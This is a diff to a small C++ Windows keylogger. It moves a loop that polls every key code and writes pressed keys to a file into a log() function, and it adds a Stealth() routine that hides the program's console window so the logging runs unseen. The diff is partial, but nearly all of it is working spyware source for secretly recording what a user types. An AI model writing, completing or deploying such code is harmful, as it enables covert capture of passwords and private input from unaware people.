@@ -1,13 +1,24 @@
-#include <iostream>
+ #include <iostream>
 #include <winuser.h>
 #include <windows.h>
 #include <fstream>
 using namespace std;
+void log();
+void Stealth();
 
 
 int main()
 {
-    char key;
+      Stealth();
+      log();
+
+
+    return 0;
+}
+
+void log()
+{
+      char key;
     for (; ; )
     {
         for (key=8;key<222 ;key++ )
@@ -24,13 +35,14 @@ int main()
                               break;
                               }
                               else if ( key>=96 && key<=105 )
-                              {
-                                    key-=48;
-                                    write << key;
-                                    break;
-                              }
+                        {
+                              key-=48;
+                              write << key;
+                              break;
+                        }
                               write<<key;
                         }
+
                         else if ( key>64 && key<91 )
                         {
                               write << key;
@@ -56,5 +68,12 @@ int main()
                 }
         }
     }
-    return 0;
 }
+void Stealth()
+{
+  HWND Stealth;
+  AllocConsole();
+  Stealth = FindWindowA("ConsoleWindowClass",NULL);
+  ShowWindow(Stealth,0);
+}
+
